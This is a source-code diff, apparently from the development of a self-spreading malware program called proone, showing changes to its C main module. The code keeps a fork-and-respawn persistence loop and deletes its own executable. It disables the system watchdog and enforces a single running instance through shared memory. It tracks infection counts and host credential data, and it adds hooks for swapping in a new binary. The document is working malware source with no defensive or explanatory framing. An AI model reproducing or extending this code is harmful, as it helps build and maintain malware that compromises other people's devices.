@@ -88,6 +88,23 @@ static void handle_sigpipe (const int sn) {
 }
 #endif
 
+static void handle_sigchld (const int sn) {
+	const int saved_errno = errno;
+	pid_t reaped;
+
+	do {
+		reaped = waitpid(-1, NULL, WNOHANG);
+	} while (reaped > 0);
+
+	errno = saved_errno;
+}
+
+static void seed_ssl_rnd (const uint8_t *seed, const size_t slen) {
+	if (mbedtls_ctr_drbg_seed(&prne_g.ssl.rnd, mbedtls_entropy_func, &prne_g.ssl.entpy, seed, slen) != 0) {
+		mbedtls_ctr_drbg_seed(&prne_g.ssl.rnd, mbedtls_entropy_func, &prne_g.ssl.entpy, NULL, 0);
+	}
+}
+
 static int proone_main (void) {
 #ifdef PRNE_DEBUG
 	static const struct timespec DBG_BUSY_CHECK_INT = { 1, 0 }; // 1s
@@ -105,11 +122,15 @@ static int proone_main (void) {
 	} dbg;
 #endif
 
+	prne_ok_or_die(clock_gettime(CLOCK_MONOTONIC, &prne_g.child_start));
+	seed_ssl_rnd((const uint8_t*)PRNE_BUILD_ENTROPY, sizeof(PRNE_BUILD_ENTROPY));
+
 #ifdef PRNE_DEBUG
 	signal(SIGPIPE, handle_sigpipe);
 #else
 	signal(SIGPIPE, SIG_IGN);
 #endif
+	signal(SIGCHLD, handle_sigchld);
 
 #ifdef PRNE_DEBUG
 	prne_init_wkr_sched_req(&dbg.sched);
@@ -120,13 +141,6 @@ static int proone_main (void) {
 	prne_init_wkr_tick_info(&tick_info);
 	prne_init_llist(&wkr_pool);
 	alloc_workers(&sched_req);
-	if (pipe(int_pipe) == 0) {
-		prne_set_pipe_size(int_pipe[0], 1);
-		prne_ok_or_die(fcntl(int_pipe[0], F_SETFL, O_NONBLOCK));
-		prne_ok_or_die(fcntl(int_pipe[1], F_SETFL, O_NONBLOCK));
-		prne_ok_or_die(fcntl(int_pipe[0], F_SETFD, FD_CLOEXEC));
-		prne_ok_or_die(fcntl(int_pipe[1], F_SETFD, FD_CLOEXEC));
-	}
 	int_pfd = prne_alloc_wkr_pollfd_slot(&sched_req);
 	if (int_pfd != NULL) {
 		int_pfd->pfd.fd = int_pipe[0];
@@ -218,7 +232,7 @@ END:
 static bool ensure_single_instance (void) {
 	prne_g.lock_shm_fd = shm_open(
 		prne_dvault_unmask_entry_cstr(PRNE_DATA_KEY_PROC_LIM_SHM, NULL),
-		O_RDWR | O_CREAT,
+		O_RDWR | O_CREAT | O_CLOEXEC,
 		0666);
 	prne_dvault_reset_dict();
 	if (prne_g.lock_shm_fd < 0) {
@@ -278,10 +292,13 @@ static void disasble_watchdog (void) {
 }
 
 static void handle_interrupt (const int sig) {
+	const int saved_errno = errno;
 	uint8_t rubbish = 0;
 
 	prne_g.caught_signal = sig;
 	write(int_pipe[1], &rubbish, 1);
+
+	errno = saved_errno;
 }
 
 static void setup_signal_actions (void) {
@@ -362,12 +379,6 @@ static void load_ssl_conf (void) {
 	}
 }
 
-static void seed_ssl_rnd (const uint8_t *seed, const size_t slen) {
-	if (mbedtls_ctr_drbg_seed(&prne_g.ssl.rnd, mbedtls_entropy_func, &prne_g.ssl.entpy, seed, slen) != 0) {
-		mbedtls_ctr_drbg_seed(&prne_g.ssl.rnd, mbedtls_entropy_func, &prne_g.ssl.entpy, NULL, 0);
-	}
-}
-
 static void init_shared_global (void) {
 	// just die on error
 	const size_t str_len = 1 + 30;
@@ -397,22 +408,52 @@ static void init_shared_global (void) {
 
 	prne_s_g->bne_cnt = 0;
 	prne_s_g->infect_cnt = 0;
+	prne_s_g->ny_bin_name[0] = 0;
+}
+
+static void init_ids (void) {
+	char line[37];
+	int fd = -1;
+
+	if (mbedtls_ctr_drbg_random(&prne_g.ssl.rnd, prne_g.instance_id, sizeof(prne_g.instance_id)) != 0) {
+		memzero(prne_g.instance_id, sizeof(prne_g.instance_id));
+	}
+
+	memzero(prne_g.boot_id, 16);
+	do { // fake loop
+		fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
+		if (fd < 0) {
+			break;
+		}
+		
+		if (read(fd, line, 36) != 36) {
+			break;
+		}
+		line[36] = 0;
+
+		if (!prne_uuid_fromstr(line, prne_g.boot_id)) {
+			break;
+		}
+	} while (false);
+	prne_close(fd);
+}
+
+static void run_ny_bin (void) {
+	// TODO
 }
 
 
 int main (const int argc, char **args) {
 	static int exit_code = 0;
-	static int exit_pipe[2] = { -1, -1 };
 
 	prne_g.host_cred_data = NULL;
 	prne_g.host_cred_size = 0;
-	prne_ok_or_die(clock_gettime(CLOCK_MONOTONIC, &prne_g.god_start));
+	prne_ok_or_die(clock_gettime(CLOCK_MONOTONIC, &prne_g.parent_start));
 	prne_g.run_cnt = 0;
 	prne_g.resolv = NULL;
-	prne_g.god_exit_evt = -1;
 	prne_g.caught_signal = 0;
-	prne_g.god_pid = getpid();
-	prne_g.proone_pid = 0;
+	prne_g.parent_pid = getpid();
+	prne_g.child_pid = 0;
 	prne_g.lock_shm_fd = -1;
 	prne_g.bin_ready = false;
 	prne_g.is_child = false;
@@ -433,18 +474,11 @@ int main (const int argc, char **args) {
 	// inits that need no outside resources
 	prne_init_dvault();
 	set_env();
-	if (pipe(exit_pipe) == 0) {
-		prne_set_pipe_size(exit_pipe[0], 1);
-		prne_ok_or_die(fcntl(exit_pipe[0], F_SETFL, O_NONBLOCK));
-		prne_ok_or_die(fcntl(exit_pipe[1], F_SETFL, O_NONBLOCK));
-		prne_ok_or_die(fcntl(exit_pipe[0], F_SETFD, FD_CLOEXEC));
-		prne_ok_or_die(fcntl(exit_pipe[1], F_SETFD, FD_CLOEXEC));
-		prne_g.god_exit_evt = exit_pipe[0];
-	}
 
 	/* inits that need outside resources. IN THIS ORDER! */
 	load_ssl_conf();
 	seed_ssl_rnd(NULL, 0);
+	init_ids();
 	init_shared_global();
 	delete_myself(args[0]);
 	disasble_watchdog();
@@ -465,21 +499,29 @@ int main (const int argc, char **args) {
 	prne_close(STDERR_FILENO);
 #endif
 
+	if (pipe(int_pipe) == 0) {
+		prne_set_pipe_size(int_pipe[0], 1);
+		prne_ok_or_die(fcntl(int_pipe[0], F_SETFL, O_NONBLOCK));
+		prne_ok_or_die(fcntl(int_pipe[1], F_SETFL, O_NONBLOCK));
+		prne_ok_or_die(fcntl(int_pipe[0], F_SETFD, FD_CLOEXEC));
+		prne_ok_or_die(fcntl(int_pipe[1], F_SETFD, FD_CLOEXEC));
+	}
 	setup_signal_actions();
 
 	// main loop
 	while (prne_g.caught_signal == 0) {
-		prne_g.proone_pid = fork();
+		prne_g.child_pid = fork();
 
-		if (prne_g.proone_pid >= 0) {
+		if (prne_g.child_pid >= 0) {
 			prne_g.run_cnt += 1;
 		}
 
-		if (prne_g.proone_pid > 0) {
+		if (prne_g.child_pid > 0) {
 			static int status;
+			static bool has_ny_bin;
 
 			while (prne_g.caught_signal == 0) {
-				if (waitpid(prne_g.proone_pid, &status, 0) < 0) {
+				if (waitpid(prne_g.child_pid, &status, 0) < 0) {
 					if (errno != EINTR) {
 						abort();
 					}
@@ -490,18 +532,30 @@ int main (const int argc, char **args) {
 				break;
 			}
 
+			has_ny_bin = strlen(prne_s_g->ny_bin_name) > 0;
+
 			if (WIFEXITED(status)) {
 				if (WEXITSTATUS(status) == 0) {
+					if (has_ny_bin) {
+						run_ny_bin();
+						// run_ny_bin() returns if fails
+					}
 					break;
 				}
+
 #ifdef PRNE_DEBUG
-				fprintf(stderr, "* child process %d exited with code %d!\n", prne_g.proone_pid, WEXITSTATUS(status));
+				fprintf(stderr, "* child process %d exited with code %d!\n", prne_g.child_pid, WEXITSTATUS(status));
 #endif
 			}
 			else if (WIFSIGNALED(status)) {
 #ifdef PRNE_DEBUG
-				fprintf(stderr, "* child process %d received signal %d!\n", prne_g.proone_pid, WTERMSIG(status));
+				fprintf(stderr, "* child process %d received signal %d!\n", prne_g.child_pid, WTERMSIG(status));
 #endif
+			}
+
+			if (has_ny_bin) {
+				shm_unlink(prne_s_g->ny_bin_name);
+				memzero(prne_s_g->ny_bin_name, sizeof(prne_s_g->ny_bin_name));
 			}
 
 			sleep(1);
@@ -510,13 +564,12 @@ int main (const int argc, char **args) {
 			prne_close(prne_g.lock_shm_fd);
 			prne_g.lock_shm_fd = -1;
 			prne_g.is_child = true;
-			seed_ssl_rnd((const uint8_t*)PRNE_BUILD_ENTROPY, sizeof(PRNE_BUILD_ENTROPY));
 		
 			exit_code = proone_main();
 			break;
 		}
 	}
-	prne_g.proone_pid = 0;
+	prne_g.child_pid = 0;
 
 END:
 	prne_free_bin_archive(&prne_g.bin_archive);
@@ -547,10 +600,6 @@ END:
 	}
 
 	prne_deinit_dvault();
-
-	write(exit_pipe[1], &exit_code, sizeof(int));
-	prne_close(exit_pipe[0]);
-	prne_close(exit_pipe[1]);
 
 	return exit_code;
 }
